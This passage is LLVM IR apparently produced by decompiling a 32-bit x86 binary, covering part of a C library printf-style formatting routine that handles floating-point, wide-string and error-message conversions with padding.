dec_label_pc_8051f33:                             ; preds = %dec_label_pc_8051f2f
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8051f38 = inttoptr i32 %v0_8051f43 to i8*
  %v2_8051f38 = load i8, i8* %v1_8051f38, align 1
  %v8_8051f38 = icmp eq i8 %v2_8051f38, 48
  br i1 %v8_8051f38, label %dec_label_pc_8051f43, label %dec_label_pc_8051f3d

dec_label_pc_8051f3d:                             ; preds = %dec_label_pc_8051f33
  %v1_8051f3d = add i32 %v2_8051efb, 128
  store i32 %v1_8051f3d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051f43

dec_label_pc_8051f43:                             ; preds = %dec_label_pc_8051f2a.thread, %dec_label_pc_8051f2f, %dec_label_pc_8051f33, %dec_label_pc_8051f2a, %dec_label_pc_8051f09, %dec_label_pc_8051f23, %dec_label_pc_8051f3d
  %v0_8051f7b = phi i32 [ %v0_8051f2f, %dec_label_pc_8051f2f ], [ 1, %dec_label_pc_8051f33 ], [ %v0_8051f2f, %dec_label_pc_8051f2a ], [ %v0_8051f2f, %dec_label_pc_8051f09 ], [ %v0_8051f2f, %dec_label_pc_8051f23 ], [ %v1_8051f3d, %dec_label_pc_8051f3d ], [ %v0_8051f2f, %dec_label_pc_8051f2a.thread ]
  %v1_8051f43 = inttoptr i32 %v0_8051f43 to i8*
  %v2_8051f43 = load i8, i8* %v1_8051f43, align 1
  %v8_8051f43 = icmp eq i8 %v2_8051f43, 48
  %v1_8051f46 = icmp eq i1 %v8_8051f43, false
  br i1 %v1_8051f46, label %dec_label_pc_8051f73, label %dec_label_pc_8051f48

dec_label_pc_8051f48:                             ; preds = %dec_label_pc_8051f43
  %v0_8051f48 = load i32, i32* @ebp, align 4
  %v7_8051f4b = icmp sgt i32 %v0_8051f48, 5
  br i1 %v7_8051f4b, label %dec_label_pc_8051f4d, label %dec_label_pc_8051f52

dec_label_pc_8051f4d:                             ; preds = %dec_label_pc_8051f48
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_8051f52

dec_label_pc_8051f52:                             ; preds = %dec_label_pc_8051f48, %dec_label_pc_8051f4d
  %v1_8051f52 = add i32 %v0_8051f52, 48
  %v2_8051f52 = inttoptr i32 %v1_8051f52 to i32*
  %v3_8051f52 = load i32, i32* %v2_8051f52, align 4
  %v12_8051f52 = icmp eq i32 %v3_8051f52, 1
  %v1_8051f57 = icmp eq i1 %v12_8051f52, false
  br i1 %v1_8051f57, label %dec_label_pc_8051f68, label %dec_label_pc_8051f59

dec_label_pc_8051f59:                             ; preds = %dec_label_pc_8051f52
  store i32 ptrtoint ([6 x i8]* @global_var_805b5b8.490 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_80520e4

dec_label_pc_8051f68:                             ; preds = %dec_label_pc_8051f52
  %v1_8051f68 = icmp eq i32 %v0_8051f7b, 0
  %v1_8051f6a = icmp eq i1 %v1_8051f68, false
  br i1 %v1_8051f6a, label %dec_label_pc_8051f73, label %dec_label_pc_8051f6c

dec_label_pc_8051f6c:                             ; preds = %dec_label_pc_8051f68
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80520e4

dec_label_pc_8051f73:                             ; preds = %dec_label_pc_8051f68, %dec_label_pc_8051f43
  %v2_8051f73 = sub i32 %v0_8051f7b, %v1_8051eff
  %v7_8051f73 = icmp ult i32 %v0_8051f7b, %v1_8051eff
  %v12_8051f73 = icmp eq i32 %v2_8051f73, 0
  %v2_8051f75 = or i1 %v7_8051f73, %v12_8051f73
  br i1 %v2_8051f75, label %dec_label_pc_80520e4, label %dec_label_pc_8051f7b

dec_label_pc_8051f7b:                             ; preds = %dec_label_pc_8051f73
  store i32 %v2_8051f73, i32* @ebx, align 4
  br label %dec_label_pc_80520fe

dec_label_pc_8051f84:                             ; preds = %dec_label_pc_8051e1a
  %tmp99 = icmp ult i32 %v3_8051dec, 16
  br i1 %tmp99, label %dec_label_pc_8051f89, label %dec_label_pc_8051fce

dec_label_pc_8051f89:                             ; preds = %dec_label_pc_8051f84
  %v1_8051f89 = add i32 %v0_8051dec.lcssa, 33
  %v2_8051f89 = inttoptr i32 %v1_8051f89 to i8*
  %v3_8051f89 = load i8, i8* %v2_8051f89, align 1
  %v4_8051f89 = and i8 %v3_8051f89, 8
  %v5_8051f89 = icmp eq i8 %v4_8051f89, 0
  %v1_8051f8e = add i32 %v0_8051dec.lcssa, 344
  %v2_8051f8e = inttoptr i32 %v1_8051f8e to i32*
  %v3_8051f8e = load i32, i32* %v2_8051f8e, align 4
  store i32 %v3_8051f8e, i32* %edx.global-to-local, align 4
  br i1 %v5_8051f89, label %dec_label_pc_8051f9b, label %dec_label_pc_8051f97

dec_label_pc_8051f97:                             ; preds = %dec_label_pc_8051f89
  %v1_8051f97 = inttoptr i32 %v3_8051f8e to x86_fp80*
  %v2_8051f97 = load x86_fp80, x86_fp80* %v1_8051f97, align 4
  br label %dec_label_pc_8051f9d

dec_label_pc_8051f9b:                             ; preds = %dec_label_pc_8051f89
  %v1_8051f9b = inttoptr i32 %v3_8051f8e to double*
  %v2_8051f9b = load double, double* %v1_8051f9b, align 4
  %v3_8051f9b = fpext double %v2_8051f9b to x86_fp80
  br label %dec_label_pc_8051f9d

dec_label_pc_8051f9d:                             ; preds = %dec_label_pc_8051f97, %dec_label_pc_8051f9b
  %storemerge5 = phi x86_fp80 [ %v2_8051f97, %dec_label_pc_8051f97 ], [ %v3_8051f9b, %dec_label_pc_8051f9b ]
  store x86_fp80 %storemerge5, x86_fp80* %st0.global-to-local, align 4
  %v0_8051f9d = load i32, i32* @esi, align 4
  %v2_8051f9d = add i32 %v0_8051dec.lcssa, -4
  %v3_8051f9d = inttoptr i32 %v2_8051f9d to i32*
  store i32 %v0_8051f9d, i32* %v3_8051f9d, align 4
  %v0_8051f9e = load i32, i32* @esi, align 4
  %v2_8051f9e = add i32 %v0_8051dec.lcssa, -8
  %v3_8051f9e = inttoptr i32 %v2_8051f9e to i32*
  store i32 %v0_8051f9e, i32* %v3_8051f9e, align 4
  %v1_8051f9f = add i32 %v0_8051dec.lcssa, -12
  %v2_8051f9f = inttoptr i32 %v1_8051f9f to i32*
  store i32 134552674, i32* %v2_8051f9f, align 4
  %v1_8051fa4 = add i32 %v0_8051dec.lcssa, 20
  store i32 %v1_8051fa4, i32* %eax.global-to-local, align 4
  %v2_8051fa8 = add i32 %v0_8051dec.lcssa, -16
  %v3_8051fa8 = inttoptr i32 %v2_8051fa8 to i32*
  store i32 %v1_8051fa4, i32* %v3_8051fa8, align 4
  %v1_8051fa9 = add i32 %v0_8051dec.lcssa, -28
  %v1_8051fac = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_8051fac = inttoptr i32 %v1_8051fa9 to x86_fp80*
  store x86_fp80 %v1_8051fac, x86_fp80* %v3_8051fac, align 4
  %v1_8051faf = add i32 %v0_8051dec.lcssa, 368
  %v2_8051faf = inttoptr i32 %v1_8051faf to i32*
  %v3_8051faf = load i32, i32* %v2_8051faf, align 4
  %v5_8051faf = add i32 %v0_8051dec.lcssa, -32
  %v6_8051faf = inttoptr i32 %v5_8051faf to i32*
  store i32 %v3_8051faf, i32* %v6_8051faf, align 4
  %v0_8051fb6 = call i32 @_fpmaxtostr()
  store i32 %v0_8051fb6, i32* %eax.global-to-local, align 4
  %v0_8051fbb = load i32, i32* @esp, align 4
  %v1_8051fbb = add i32 %v0_8051fbb, 32
  %v2_8051fbe = icmp slt i32 %v0_8051fb6, 0
  br i1 %v2_8051fbe, label %dec_label_pc_805225f, label %dec_label_pc_8051fc6

dec_label_pc_8051fc6:                             ; preds = %dec_label_pc_8051f9d
  %v1_8051fc6 = inttoptr i32 %v1_8051fbb to i32*
  %v2_8051fc6 = load i32, i32* %v1_8051fc6, align 4
  %v4_8051fc6 = add i32 %v2_8051fc6, %v0_8051fb6
  store i32 %v4_8051fc6, i32* %v1_8051fc6, align 4
  %v0_805224c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805224c

dec_label_pc_8051fce:                             ; preds = %dec_label_pc_8051f84
  %tmp100 = or i32 %v3_8051dec, 1
  %tmp101 = icmp eq i32 %tmp100, 17
  br i1 %tmp101, label %dec_label_pc_8051fd7, label %dec_label_pc_805206a

dec_label_pc_8051fd7:                             ; preds = %dec_label_pc_8051fce
  %v9_8051fce = icmp eq i32 %v3_8051dec, 17
  %v1_8051fd7 = add i32 %v0_8051dec.lcssa, 332
  %v2_8051fd7 = inttoptr i32 %v1_8051fd7 to i32*
  store i32 0, i32* %v2_8051fd7, align 4
  %v0_8051fe2 = load i32, i32* @esp, align 4
  %v1_8051fe2 = add i32 %v0_8051fe2, 344
  %v2_8051fe2 = inttoptr i32 %v1_8051fe2 to i32*
  %v3_8051fe2 = load i32, i32* %v2_8051fe2, align 4
  store i32 %v3_8051fe2, i32* %edx.global-to-local, align 4
  %v1_8051fe9 = icmp eq i1 %v9_8051fce, false
  br i1 %v1_8051fe9, label %dec_label_pc_8052035, label %dec_label_pc_8051feb

dec_label_pc_8051feb:                             ; preds = %dec_label_pc_8051fd7
  %v1_8051feb = inttoptr i32 %v3_8051fe2 to i32*
  %v2_8051feb = load i32, i32* %v1_8051feb, align 4
  store i32 %v2_8051feb, i32* %eax.global-to-local, align 4
  %v2_8051fed = add i32 %v0_8051fe2, 340
  %v3_8051fed = inttoptr i32 %v2_8051fed to i32*
  store i32 %v2_8051feb, i32* %v3_8051fed, align 4
  %v0_8051ff4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051ff4 = icmp eq i32 %v0_8051ff4, 0
  br i1 %v1_8051ff4, label %dec_label_pc_80520e8, label %dec_label_pc_8051ffc

dec_label_pc_8051ffc:                             ; preds = %dec_label_pc_8051feb
  %v0_8051ffc = load i32, i32* @esp, align 4
  %v1_8051ffc = add i32 %v0_8051ffc, 20
  %v2_8051ffc = inttoptr i32 %v1_8051ffc to i32*
  %v3_8051ffc = load i32, i32* %v2_8051ffc, align 4
  store i32 %v3_8051ffc, i32* %eax.global-to-local, align 4
  %v2_8052003 = icmp slt i32 %v3_8051ffc, 0
  br i1 %v2_8052003, label %dec_label_pc_8052009, label %dec_label_pc_8052007

dec_label_pc_8052007:                             ; preds = %dec_label_pc_8051ffc
  br label %dec_label_pc_8052009

dec_label_pc_8052009:                             ; preds = %dec_label_pc_8051ffc, %dec_label_pc_8052007
  %storemerge105 = phi i32 [ %v3_8051ffc, %dec_label_pc_8052007 ], [ -1, %dec_label_pc_8051ffc ]
  store i32 %storemerge105, i32* %ecx.global-to-local, align 4
  %v1_8052009 = add i32 %v0_8051ffc, 340
  store i32 %v1_8052009, i32* %edx.global-to-local, align 4
  %v1_8052010 = add i32 %v0_8051ffc, 332
  store i32 %v1_8052010, i32* %eax.global-to-local, align 4
  %v2_8052017 = add i32 %v0_8051ffc, -4
  %v3_8052017 = inttoptr i32 %v2_8052017 to i32*
  store i32 %v1_8052010, i32* %v3_8052017, align 4
  %v0_8052018 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052018 = add i32 %v0_8051ffc, -8
  %v3_8052018 = inttoptr i32 %v2_8052018 to i32*
  store i32 %v0_8052018, i32* %v3_8052018, align 4
  %v0_8052019 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052019 = add i32 %v0_8051ffc, -12
  %v3_8052019 = inttoptr i32 %v2_8052019 to i32*
  store i32 %v0_8052019, i32* %v3_8052019, align 4
  %v0_805201a = load i32, i32* %edx.global-to-local, align 4
  %v2_805201a = add i32 %v0_8051ffc, -16
  %v3_805201a = inttoptr i32 %v2_805201a to i32*
  store i32 %v0_805201a, i32* %v3_805201a, align 4
  %v0_805201b = call i32 @__GI_wcsrtombs()
  store i32 %v0_805201b, i32* %eax.global-to-local, align 4
  %v0_8052020 = load i32, i32* @esp, align 4
  %v1_8052020 = add i32 %v0_8052020, 16
  store i32 %v0_805201b, i32* @esi, align 4
  %v10_8052025 = icmp eq i32 %v0_805201b, -1
  br i1 %v10_8052025, label %dec_label_pc_805225f, label %dec_label_pc_805202e

dec_label_pc_805202e:                             ; preds = %dec_label_pc_8052009
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_80520f2

dec_label_pc_8052035:                             ; preds = %dec_label_pc_8051fd7
  %v0_8052035 = load i32, i32* @ebx, align 4
  %v2_8052035 = add i32 %v0_8051fe2, -4
  %v3_8052035 = inttoptr i32 %v2_8052035 to i32*
  store i32 %v0_8052035, i32* %v3_8052035, align 4
  %v1_8052036 = add i32 %v0_8051fe2, 332
  store i32 %v1_8052036, i32* %eax.global-to-local, align 4
  %v2_805203d = add i32 %v0_8051fe2, -8
  %v3_805203d = inttoptr i32 %v2_805203d to i32*
  store i32 %v1_8052036, i32* %v3_805203d, align 4
  %v0_805203e = load i32, i32* %edx.global-to-local, align 4
  %v1_805203e = inttoptr i32 %v0_805203e to i32*
  %v2_805203e = load i32, i32* %v1_805203e, align 4
  %v4_805203e = add i32 %v0_8051fe2, -12
  %v5_805203e = inttoptr i32 %v4_805203e to i32*
  store i32 %v2_805203e, i32* %v5_805203e, align 4
  %v1_8052040 = add i32 %v0_8051fe2, 204
  store i32 %v1_8052040, i32* @ebx, align 4
  %v2_8052047 = add i32 %v0_8051fe2, -16
  %v3_8052047 = inttoptr i32 %v2_8052047 to i32*
  store i32 %v1_8052040, i32* %v3_8052047, align 4
  %v0_8052048 = call i32 @__GI_wcrtomb()
  store i32 %v0_8052048, i32* %eax.global-to-local, align 4
  %v0_805204d = load i32, i32* @esp, align 4
  %v1_805204d = add i32 %v0_805204d, 16
  store i32 %v0_8052048, i32* @esi, align 4
  %v10_8052052 = icmp eq i32 %v0_8052048, -1
  br i1 %v10_8052052, label %dec_label_pc_805225f, label %dec_label_pc_805205b

dec_label_pc_805205b:                             ; preds = %dec_label_pc_8052035
  %v0_805205b = load i32, i32* @ebx, align 4
  store i32 %v0_805205b, i32* @edi, align 4
  %v2_805205d = add i32 %v0_8052048, 220
  %v3_805205d = add i32 %v2_805205d, %v0_805204d
  %v4_805205d = inttoptr i32 %v3_805205d to i8*
  store i8 0, i8* %v4_805205d, align 1
  br label %dec_label_pc_80520f2

dec_label_pc_805206a:                             ; preds = %dec_label_pc_8051fce
  %tmp102 = icmp ult i32 %v3_8051dec, 20
  br i1 %tmp102, label %dec_label_pc_805206f, label %dec_label_pc_80520ba

dec_label_pc_805206f:                             ; preds = %dec_label_pc_805206a
  %v9_805206a = icmp eq i32 %v3_8051dec, 19
  %v1_805206f = add i32 %v0_8051dec.lcssa, 344
  %v2_805206f = inttoptr i32 %v1_805206f to i32*
  %v3_805206f = load i32, i32* %v2_805206f, align 4
  store i32 %v3_805206f, i32* %edx.global-to-local, align 4
  %v1_8052076 = icmp eq i1 %v9_805206a, false
  %v1_805209b = inttoptr i32 %v3_805206f to i32*
  %v2_805209b = load i32, i32* %v1_805209b, align 4
  br i1 %v1_8052076, label %dec_label_pc_805209b, label %dec_label_pc_8052078

dec_label_pc_8052078:                             ; preds = %dec_label_pc_805206f
  store i32 %v2_805209b, i32* @edi, align 4
  %v1_805207a = icmp eq i32 %v2_805209b, 0
  br i1 %v1_805207a, label %dec_label_pc_80520e8, label %dec_label_pc_805207e

dec_label_pc_805207e:                             ; preds = %dec_label_pc_8052078, %dec_label_pc_80520c3
  %v1_805208b = phi i32 [ %v0_8051dec.lcssa, %dec_label_pc_8052078 ], [ %v1_80520dd, %dec_label_pc_80520c3 ]
  %v1_805207e = add i32 %v1_805208b, 20
  %v2_805207e = inttoptr i32 %v1_805207e to i32*
  %v3_805207e = load i32, i32* %v2_805207e, align 4
  store i32 %v3_805207e, i32* %eax.global-to-local, align 4
  %v2_8052085 = icmp slt i32 %v3_805207e, 0
  br i1 %v2_8052085, label %dec_label_pc_805208b, label %dec_label_pc_8052089

dec_label_pc_8052089:                             ; preds = %dec_label_pc_805207e
  br label %dec_label_pc_805208b

dec_label_pc_805208b:                             ; preds = %dec_label_pc_805207e, %dec_label_pc_8052089
  %storemerge = phi i32 [ %v3_805207e, %dec_label_pc_8052089 ], [ -1, %dec_label_pc_805207e ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_805208b = add i32 %v1_805208b, -4
  %v3_805208b = inttoptr i32 %v2_805208b to i32*
  store i32 %v3_8051dec, i32* %v3_805208b, align 4
  %v2_805208c = add i32 %v1_805208b, -8
  %v3_805208c = inttoptr i32 %v2_805208c to i32*
  store i32 %v3_8051dec, i32* %v3_805208c, align 4
  %v0_805208d = load i32, i32* %edx.global-to-local, align 4
  %v2_805208d = add i32 %v1_805208b, -12
  %v3_805208d = inttoptr i32 %v2_805208d to i32*
  store i32 %v0_805208d, i32* %v3_805208d, align 4
  %v0_805208e = load i32, i32* @edi, align 4
  %v2_805208e = add i32 %v1_805208b, -16
  %v3_805208e = inttoptr i32 %v2_805208e to i32*
  store i32 %v0_805208e, i32* %v3_805208e, align 4
  %v0_805208f = call i32 @strnlen()
  store i32 %v0_805208f, i32* %eax.global-to-local, align 4
  store i32 %v0_805208f, i32* @esi, align 4
  br label %dec_label_pc_80520f2

dec_label_pc_805209b:                             ; preds = %dec_label_pc_805206f
  store i32 %v2_805209b, i32* %eax.global-to-local, align 4
  %v1_805209d = add i32 %v0_8051dec.lcssa, 204
  store i32 %v1_805209d, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_80520a9 = trunc i32 %v2_805209b to i8
  %v4_80520a9 = inttoptr i32 %v1_805209d to i8*
  store i8 %v1_80520a9, i8* %v4_80520a9, align 1
  %v0_80520b0 = load i32, i32* @esp, align 4
  %v1_80520b0 = add i32 %v0_80520b0, 205
  %v2_80520b0 = inttoptr i32 %v1_80520b0 to i8*
  store i8 0, i8* %v2_80520b0, align 1
  br label %dec_label_pc_80520f2

dec_label_pc_80520ba:                             ; preds = %dec_label_pc_805206a
  %v9_80520ba = icmp eq i32 %v3_8051dec, 20
  %v1_80520bd = icmp eq i1 %v9_80520ba, false
  br i1 %v1_80520bd, label %dec_label_pc_805225f, label %dec_label_pc_80520c3

dec_label_pc_80520c3:                             ; preds = %dec_label_pc_80520ba
  %v0_80520c3 = load i32, i32* %stack_var_-364, align 4
  %v1_80520c3 = call i32 @__errno_location(i32 %v0_80520c3)
  store i32 %v1_80520c3, i32* %eax.global-to-local, align 4
  %v0_80520c8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80520c8 = load i32, i32* @esp, align 4
  %v2_80520c8 = add i32 %v1_80520c8, -4
  %v3_80520c8 = inttoptr i32 %v2_80520c8 to i32*
  store i32 %v0_80520c8, i32* %v3_80520c8, align 4
  %v1_80520c9 = add i32 %v1_80520c8, -8
  %v2_80520c9 = inttoptr i32 %v1_80520c9 to i32*
  store i32 128, i32* %v2_80520c9, align 4
  %v1_80520ce = add i32 %v1_80520c8, 204
  store i32 %v1_80520ce, i32* %edx.global-to-local, align 4
  %v2_80520d5 = add i32 %v1_80520c8, -12
  %v3_80520d5 = inttoptr i32 %v2_80520d5 to i32*
  store i32 %v1_80520ce, i32* %v3_80520d5, align 4
  %v1_80520d6 = inttoptr i32 %v1_80520c3 to i32*
  %v2_80520d6 = load i32, i32* %v1_80520d6, align 4
  %v4_80520d6 = add i32 %v1_80520c8, -16
  %v5_80520d6 = inttoptr i32 %v4_80520d6 to i32*
  store i32 %v2_80520d6, i32* %v5_80520d6, align 4
  %v0_80520d8 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_80520d8, i32* %eax.global-to-local, align 4
  %v0_80520dd = load i32, i32* @esp, align 4
  %v1_80520dd = add i32 %v0_80520dd, 16
  store i32 %v0_80520d8, i32* @edi, align 4
  br label %dec_label_pc_805207e

dec_label_pc_80520e4:                             ; preds = %dec_label_pc_8051f73, %dec_label_pc_8051f6c, %dec_label_pc_8051f59
  %v0_80520fe37 = phi i32 [ %v1_8051eff, %dec_label_pc_8051f73 ], [ 0, %dec_label_pc_8051f6c ], [ 5, %dec_label_pc_8051f59 ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80520fe

dec_label_pc_80520e8:                             ; preds = %dec_label_pc_8052078, %dec_label_pc_8051feb
  store i32 ptrtoint ([7 x i8]* @global_var_805b5be.491 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_80520f2

dec_label_pc_80520f2:                             ; preds = %dec_label_pc_805209b, %dec_label_pc_805208b, %dec_label_pc_805205b, %dec_label_pc_805202e, %dec_label_pc_80520e8
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_80520f9 = load i32, i32* @esp, align 4
  %v1_80520f9 = add i32 %v0_80520f9, 7
  %v2_80520f9 = inttoptr i32 %v1_80520f9 to i8*
  store i8 32, i8* %v2_80520f9, align 1
  %v0_80520fe.pre = load i32, i32* @esi, align 4
  %v1_80520fe.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80520fe

dec_label_pc_80520fe:                             ; preds = %dec_label_pc_80520e4, %dec_label_pc_8051f7b, %dec_label_pc_80520f2
  %v1_80520fe = phi i32 [ 0, %dec_label_pc_80520e4 ], [ %v2_8051f73, %dec_label_pc_8051f7b ], [ %v1_80520fe.pre, %dec_label_pc_80520f2 ]
  %v0_80520fe = phi i32 [ %v0_80520fe37, %dec_label_pc_80520e4 ], [ %v1_8051eff, %dec_label_pc_8051f7b ], [ %v0_80520fe.pre, %dec_label_pc_80520f2 ]
  %v2_80520fe = add i32 %v0_80520fe, %v1_80520fe
  store i32 %v2_80520fe, i32* @edx, align 4
  %v0_8052101 = load i32, i32* @ebp, align 4
  %v9_8052101 = icmp eq i32 %v0_8052101, 11
  br i1 %v9_8052101, label %dec_label_pc_8052112, label %dec_label_pc_8052106

dec_label_pc_8052106:                             ; preds = %dec_label_pc_80520fe
  %v1_8052108 = add i32 %v0_8052101, -5
  %v6_8052108 = sub i32 4, %v0_8052101
  %v7_8052108 = and i32 %v6_8052108, %v0_8052101
  %v8_8052108 = icmp slt i32 %v7_8052108, 0
  %v9_8052108 = icmp eq i32 %v1_8052108, 0
  %v10_8052108 = icmp slt i32 %v1_8052108, 0
  %v3_805210b = icmp eq i1 %v10_8052108, %v8_8052108
  %v4_805210b = icmp eq i1 %v9_8052108, false
  %v5_805210b = and i1 %v4_805210b, %v3_805210b
  %v6_805210b = zext i1 %v5_805210b to i32
  store i32 %v6_805210b, i32* %eax.global-to-local, align 4
  %v2_805210e = add i32 %v2_80520fe, 1
  %v3_805210e = add i32 %v2_805210e, %v6_805210b
  store i32 %v3_805210e, i32* @edx, align 4
  br label %dec_label_pc_8052112

dec_label_pc_8052112:                             ; preds = %dec_label_pc_80520fe, %dec_label_pc_8052106
  %v0_8052112 = load i32, i32* @esp, align 4
  %v1_8052112 = add i32 %v0_8052112, 24
  %v2_8052112 = inttoptr i32 %v1_8052112 to i32*
  %v3_8052112 = load i32, i32* %v2_8052112, align 4
  store i32 %v3_8052112, i32* %eax.global-to-local, align 4
  %v1_8052116 = add i32 %v0_8052112, 8
  %v2_8052116 = inttoptr i32 %v1_8052116 to i32*
  store i32 0, i32* %v2_8052116, align 4
  %v0_805211e = load i32, i32* %eax.global-to-local, align 4
  %v1_805211e = load i32, i32* @edx, align 4
  %v2_805211e = sub i32 %v0_805211e, %v1_805211e
  %v7_805211e = icmp ult i32 %v0_805211e, %v1_805211e
  %v12_805211e = icmp eq i32 %v2_805211e, 0
  %v2_8052120 = or i1 %v7_805211e, %v12_805211e
  br i1 %v2_8052120, label %dec_label_pc_8052128, label %dec_label_pc_8052122

dec_label_pc_8052122:                             ; preds = %dec_label_pc_8052112
  store i32 %v2_805211e, i32* %eax.global-to-local, align 4
  %v1_8052124 = load i32, i32* @esp, align 4
  %v2_8052124 = add i32 %v1_8052124, 8
  %v3_8052124 = inttoptr i32 %v2_8052124 to i32*
  store i32 %v2_805211e, i32* %v3_8052124, align 4
  %v0_805212c.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052128

dec_label_pc_8052128:                             ; preds = %dec_label_pc_8052112, %dec_label_pc_8052122
  %v0_805212c = phi i32 [ %v1_805211e, %dec_label_pc_8052112 ], [ %v0_805212c.pre, %dec_label_pc_8052122 ]
  %v0_8052128 = load i32, i32* @esp, align 4
  %v1_8052128 = add i32 %v0_8052128, 8
  %v2_8052128 = inttoptr i32 %v1_8052128 to i32*
  %v3_8052128 = load i32, i32* %v2_8052128, align 4
  store i32 %v3_8052128, i32* @ecx, align 4
  %v2_805212c = add i32 %v3_8052128, %v0_805212c
  store i32 %v2_805212c, i32* %eax.global-to-local, align 4
  %v1_805212f = inttoptr i32 %v0_8052128 to i32*
  %v2_805212f = load i32, i32* %v1_805212f, align 4
  %v4_805212f = add i32 %v2_805212f, %v2_805212c
  store i32 %v4_805212f, i32* %v1_805212f, align 4
  %v0_8052132 = load i32, i32* @esp, align 4
  %v1_8052132 = add i32 %v0_8052132, 7
  %v2_8052132 = inttoptr i32 %v1_8052132 to i8*
  %v3_8052132 = load i8, i8* %v2_8052132, align 1
  %v9_8052132 = icmp eq i8 %v3_8052132, 48
  %v1_8052137 = icmp eq i1 %v9_8052132, false
  br i1 %v1_8052137, label %dec_label_pc_8052143, label %dec_label_pc_8052139

dec_label_pc_8052139:                             ; preds = %dec_label_pc_8052128
  %v0_8052139 = load i32, i32* @ebx, align 4
  %v1_8052139 = load i32, i32* @ecx, align 4
  %v2_8052139 = add i32 %v1_8052139, %v0_8052139
  store i32 %v2_8052139, i32* @ebx, align 4
  %v1_805213b = add i32 %v0_8052132, 8
  %v2_805213b = inttoptr i32 %v1_805213b to i32*
  store i32 0, i32* %v2_805213b, align 4
  %v0_8052143.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052143

dec_label_pc_8052143:                             ; preds = %dec_label_pc_8052128, %dec_label_pc_8052139
  %v0_805214a = phi i32 [ %v0_8052132, %dec_label_pc_8052128 ], [ %v0_8052143.pre, %dec_label_pc_8052139 ]
  %v1_8052143 = add i32 %v0_805214a, 32
  %v2_8052143 = inttoptr i32 %v1_8052143 to i8*
  %v3_8052143 = load i8, i8* %v2_8052143, align 1
  %v4_8052143 = and i8 %v3_8052143, 8
  %v5_8052143 = icmp eq i8 %v4_8052143, 0
  %v1_8052148 = icmp eq i1 %v5_8052143, false
  br i1 %v1_8052148, label %dec_label_pc_8052171, label %dec_label_pc_805214a

dec_label_pc_805214a:                             ; preds = %dec_label_pc_8052143
  %v1_805214a = add i32 %v0_805214a, 8
  %v2_805214a = inttoptr i32 %v1_805214a to i32*
  %v3_805214a = load i32, i32* %v2_805214a, align 4
  store i32 %v3_805214a, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8052153 = add i32 %v0_805214a, 368
  %v2_8052153 = inttoptr i32 %v1_8052153 to i32*
  %v3_8052153 = load i32, i32* %v2_8052153, align 4
  store i32 %v3_8052153, i32* @eax, align 4
  %v0_805215a = call i32 @_charpad()
  store i32 %v0_805215a, i32* %eax.global-to-local, align 4
  %v1_805215f = load i32, i32* @esp, align 4
  %v2_805215f = add i32 %v1_805215f, 8
  %v3_805215f = inttoptr i32 %v2_805215f to i32*
  %v4_805215f = load i32, i32* %v3_805215f, align 4
  %v15_805215f = icmp eq i32 %v0_805215a, %v4_805215f
  %v1_8052163 = icmp eq i1 %v15_805215f, false
  br i1 %v1_8052163, label %dec_label_pc_805225f, label %dec_label_pc_8052169

dec_label_pc_8052169:                             ; preds = %dec_label_pc_805214a
  store i32 0, i32* %v3_805215f, align 4
  %v1_8052171.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052171

dec_label_pc_8052171:                             ; preds = %dec_label_pc_8052143, %dec_label_pc_8052169
  %v1_8052171 = phi i32 [ %v0_805214a, %dec_label_pc_8052143 ], [ %v1_8052171.pre, %dec_label_pc_8052169 ]
  %v0_8052171 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052171 = add i32 %v1_8052171, -4
  %v3_8052171 = inttoptr i32 %v2_8052171 to i32*
  store i32 %v0_8052171, i32* %v3_8052171, align 4
  %v0_8052172 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052172 = add i32 %v1_8052171, -8
  %v3_8052172 = inttoptr i32 %v2_8052172 to i32*
  store i32 %v0_8052172, i32* %v3_8052172, align 4
  %v1_8052173 = add i32 %v1_8052171, 368
  %v2_8052173 = inttoptr i32 %v1_8052173 to i32*
  %v3_8052173 = load i32, i32* %v2_8052173, align 4
  %v5_8052173 = add i32 %v1_8052171, -12
  %v6_8052173 = inttoptr i32 %v5_8052173 to i32*
  store i32 %v3_8052173, i32* %v6_8052173, align 4
  %v0_805217a = load i32, i32* @ebp, align 4
  %v1_805217a = add i32 %v0_805217a, ptrtoint (i32* @global_var_805b5c5.492 to i32)
  store i32 %v1_805217a, i32* %eax.global-to-local, align 4
  %v2_8052180 = add i32 %v1_8052171, -16
  %v3_8052180 = inttoptr i32 %v2_8052180 to i32*
  store i32 %v1_805217a, i32* %v3_8052180, align 4
  %v0_8052181 = call i32 @__GI_fputs_unlocked()
  store i32 %v0_8052181, i32* %eax.global-to-local, align 4
  %v0_8052186 = load i32, i32* @esp, align 4
  %v1_8052186 = add i32 %v0_8052186, 384
  %v2_8052186 = inttoptr i32 %v1_8052186 to i32*
  %v3_8052186 = load i32, i32* %v2_8052186, align 4
  store i32 %v3_8052186, i32* @eax, align 4
  %v0_805218d = load i32, i32* @ebx, align 4
  store i32 %v0_805218d, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_8052194 = call i32 @_charpad()
  store i32 %v0_8052194, i32* %eax.global-to-local, align 4
  %v0_8052199 = load i32, i32* @esp, align 4
  %v1_8052199 = add i32 %v0_8052199, 16
